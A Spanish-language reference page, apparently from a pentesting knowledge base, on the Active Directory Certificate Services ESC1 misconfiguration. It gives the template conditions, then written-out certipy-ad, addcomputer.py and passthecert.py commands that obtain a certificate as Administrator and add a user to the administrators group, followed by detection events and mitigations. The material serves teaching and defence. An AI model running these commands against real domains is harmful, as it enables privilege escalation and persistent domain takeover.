---
title: "AD CS: ESC1, el solicitante elige el sujeto"
tags: [windows, active-directory, adcs, esc1, certificados, passthecert]
---

# AD CS: ESC1, el solicitante elige el sujeto

[🇬🇧 English](adcs-esc1.en.md) | **Español**

## 1. Cuándo mirar aquí

Hay una CA de Active Directory y una plantilla de certificado que permite al solicitante aportar el **subject/SAN**. Si además la plantilla sirve para autenticación y la puede inscribir una cuenta de bajos privilegios, esa cuenta puede pedir un certificado a nombre de Administrator.

## 2. Condiciones

ESC1 necesita que se cumplan todas:

| Condición | Dónde se ve |
|---|---|
| `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` (`0x1`) | `msPKI-Certificate-Name-Flag` de la plantilla |
| EKU de autenticación de cliente | `pKIExtendedKeyUsage` con `1.3.6.1.5.5.7.3.2` (o Smart Card Logon / Any Purpose) |
| Inscripción para cuentas no privilegiadas | ACE de inscripción en el descriptor de la plantilla |
| Sin aprobación del manager | `msPKI-Enrollment-Flag` sin `CT_FLAG_PEND_ALL_REQUESTS` (`0x2`) |
| Sin firmas autorizadas | `msPKI-RA-Signature` = 0 |

La CA debe tener publicada la plantilla; una plantilla vulnerable que no está publicada no se puede solicitar. En el caso de Authority, el derecho lo tiene `Domain Computers`, así que el atacante crea una cuenta de equipo.

## 3. Ataque

1. Enumerar con `certipy-ad find -vulnerable` o `Certify.exe find /vulnerable`.
2. Comprobar el derecho de inscripción: usuario, grupo o `Domain Computers`.
3. Si hace falta una cuenta de equipo, comprobar `MachineAccountQuota` y crearla:

```bash
addcomputer.py 'domain.tld/user' -method LDAPS -computer-name '<MACHINE>' \
  -computer-pass '<PASS>' -dc-ip <DC_IP>
```

4. Pedir el certificado con el UPN de Administrator:

```bash
certipy-ad req -u '<MACHINE>$@domain.tld' -p '<PASS>' \
  -ca <CA_NAME> -dc-ip <DC_IP> -template <TEMPLATE> \
  -upn administrator@domain.tld
```

El resultado es un `.pfx` con la clave privada. La identidad del certificado la decide el SAN, no la cuenta que lo solicita.

## 4. PKINIT y Schannel

La vía normal es PKINIT:

```bash
certipy-ad auth -pfx administrator.pfx -dc-ip <DC_IP>
```

Si el DC no tiene certificado de KDC, devuelve `KDC_ERR_PADATA_TYPE_NOSUPP`. El certificado sigue siendo válido; se usa por **Schannel/LDAPS** con PassTheCert:

```bash
certipy-ad cert -pfx administrator.pfx -nocert -out administrator.key
certipy-ad cert -pfx administrator.pfx -nokey -out administrator.crt
python3 passthecert.py -action ldap-shell -crt administrator.crt \
  -key administrator.key -domain domain.tld -dc-ip <DC_IP>
```

Dentro de la shell se puede añadir la cuenta a un grupo privilegiado:

```text
add_user_to_group <USER> administrators
```

El certificado sobrevive al cambio de contraseña de la cuenta suplantada, así que es una **persistencia** además de una escalada. Rotar la contraseña no lo revoca: hay que revocar el certificado en la CA.

## 5. Detección

- Plantillas con `ENROLLEE_SUPPLIES_SUBJECT` y EKU de autenticación: revisión periódica con Certipy, Defender for Identity o la evaluación de exposición de ADCS.
- Solicitudes y emisiones de certificados: eventos 4886 y 4887 del servicio de certificados.
- Autenticaciones Kerberos con PKINIT (4768/4769) desde cuentas y hosts no habituales.
- Cambios en plantillas y en el descriptor de inscripción: 5136 sobre objetos de `Certificate Templates`.
- Creación de cuentas de equipo y `MachineAccountQuota` distinto de 0.
- Altas en `Administrators` o `Domain Admins`: 4728/4732.
- Emisión de certificados para un UPN distinto del `sAMAccountName` del solicitante; comparar el SAN con la cuenta que pidió el certificado.

## 6. Mitigación

- Quitar **Supply in the request** de la plantilla (desmarcar “Supply in the request” en `certtmpl.msc`).
- Exigir aprobación del manager (`CT_FLAG_PEND_ALL_REQUESTS`) o firmas autorizadas (`msPKI-RA-Signature` > 0).
- Restringir la inscripción a grupos concretos; quitar `Domain Computers` si la plantilla no lo necesita.
- Poner `MachineAccountQuota` a 0 si no se usan equipos no administrados.
- Revisar todas las plantillas publicadas, no solo las que aparecen como vulnerables en una herramienta.
- Aplicar las directrices de asignación fuerte de certificados (KB5014754) y planificar la aplicación completa; reduce el abuso de certificados sin SID, pero no corrige una plantilla ESC1.
- Separar la CA de los servidores de inscripción y limitar quién puede modificar plantillas y permisos.

CWE-284 (control de acceso inadecuado), CWE-295 (validación incorrecta de certificados). MITRE T1649 (robo o falsificación de certificados de autenticación), T1078.002 (cuentas de dominio), T1552.001 (credenciales en ficheros).

Referencias: SpecterOps “Certified Pre-Owned”, Microsoft [MS-CRTD] `msPKI-Certificate-Name-Flag`, KB5014754 y la documentación de Certipy/PassTheCert.
